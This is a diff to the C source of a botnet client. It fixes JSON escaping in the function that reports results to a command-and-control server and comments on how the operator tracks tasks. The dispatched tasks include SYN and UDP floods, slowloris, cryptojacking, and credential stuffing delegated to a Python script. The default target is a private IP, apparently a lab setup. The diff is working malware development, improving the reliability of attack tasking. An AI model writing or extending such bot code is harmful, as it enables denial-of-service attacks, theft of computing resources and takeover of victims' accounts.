@@ -435,11 +435,19 @@ void bot_register(void) {
 /* POST a task-completion notice to /result so the C2 operator can
  * correlate task dispatch with execution outcomes per-bot.
  * task_type : the command type string (e.g. "syn_flood")
- * status    : short human-readable outcome ("completed", "started", etc.)  */
+ * status    : short human-readable outcome ("completed", "started", etc.)
+ *
+ * NOTE: synchronous attacks (syn_flood, udp_flood) post "completed" after
+ * the blocking call returns.  Asynchronous attacks that run in detached
+ * threads (slowloris, cryptojack) and subprocess-delegated commands
+ * (cred_stuffing, dga_search) post "started" immediately after the thread
+ * or process is launched.  Key-rotation responses report "key_rotated" or
+ * "rejected_too_short".  The operator should wait ~duration seconds before
+ * checking portal attempt counts for async tasks.                          */
 void bot_post_result(const char *task_type, const char *status) {
     char body[320];
     snprintf(body, sizeof(body),
-             "{"bot_id":"%s","result":{"type":"%s","status":"%s"}}",
+             "{\"bot_id\":\"%s\",\"result\":{\"type\":\"%s\",\"status\":\"%s\"}}",
              g_bot_id, task_type, status);
     char resp[RESP_BUF] = {0};
     int r = http_post(C2_IP, C2_PORT, "/result", body, resp, sizeof(resp));
@@ -482,9 +490,6 @@ static void dispatch_task(const char *task_json) {
         bot_post_result("slowloris", "started");
 
     } else if (strcmp(type, "cryptojack") == 0) {
-        /* CPU fraction from task JSON — default 0.25 */
-        // const char *cp = strstr(task_json, "\"cpu\":");
-        // if (cp) { cp = strchr(cp+6,':'); if(!cp) cp = strstr(task_json,"\"cpu\":")+6; }
         const char *cpu_p = strstr(task_json, "\"cpu\":");
         if (cpu_p) cpu = atof(cpu_p + 6);
         CryptojackArgs *a = malloc(sizeof(CryptojackArgs));
@@ -500,6 +505,11 @@ static void dispatch_task(const char *task_json) {
         /*
          * Delegate to cred_stuffing.py, forwarding all task fields
          * so the operator's mode/jitter/workers choices are respected.
+         *
+         * The subprocess is wrapped with the system 'timeout' utility so
+         * it is killed after 'duration' seconds, preventing orphaned
+         * Python processes from accumulating when a bot receives rapid
+         * task sequences.
          *
          * Fields parsed from task JSON:
          *   target_ip   — victim host  (default 192.168.100.20)
